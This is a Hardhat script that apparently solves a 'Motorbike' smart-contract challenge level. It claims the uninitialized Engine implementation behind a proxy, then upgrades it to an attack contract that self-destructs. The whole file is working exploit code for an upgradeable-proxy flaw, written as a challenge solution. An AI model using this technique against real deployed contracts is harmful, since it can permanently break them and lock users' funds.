import { ethers } from "hardhat";
import { Motorbike__factory } from "../typechain/factories/contracts/Motorbike.sol/Motorbike__factory";
import { Engine__factory } from "../typechain/factories/contracts/Motorbike.sol/Engine__factory";
import { MotorbikeAttack__factory } from "../typechain/factories/contracts/MotorbikeAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x061ef8bFdd6AB66Fa8F79dC0f2755Ae59f252560";
    let motorbike = new Motorbike__factory(signer).attach(instance_address);
    let engine = new Engine__factory(signer).attach(instance_address);
    
    console.log(await provider.getStorageAt(motorbike.address, 0));
    console.log(await provider.getStorageAt(motorbike.address, 1));
    console.log(await provider.getStorageAt(motorbike.address, ethers.BigNumber.from("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")));
    console.log(await provider.getStorageAt("0x64e70a9c3113b73c356b37b3688b91973628ec42", 0));
    console.log(await provider.getStorageAt("0x64e70a9c3113b73c356b37b3688b91973628ec42", 1));
    
    
    
    let attack = await new MotorbikeAttack__factory(signer).deploy();
    await attack.deployed();
    
    let engine_addr = "0x64e70a9c3113b73c356b37b3688b91973628ec42";
    let engine_implementation = new Engine__factory(signer).attach(engine_addr);
    let tx = await engine_implementation.initialize();
    await tx.wait();
    console.log(await engine_implementation.upgrader());

    let data = ethers.utils.id("attack()").substring(0,10);
    console.log(data);
    tx = await engine_implementation.upgradeToAndCall(attack.address, data, {gasLimit:80000});
    await tx.wait();
    console.log(await provider.getStorageAt(motorbike.address, ethers.BigNumber.from("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")));
    console.log(await provider.getStorageAt(engine_addr, ethers.BigNumber.from("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")));  // selfdestruct
    
    //console.log(await engine_implementation.upgrader());
}   

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
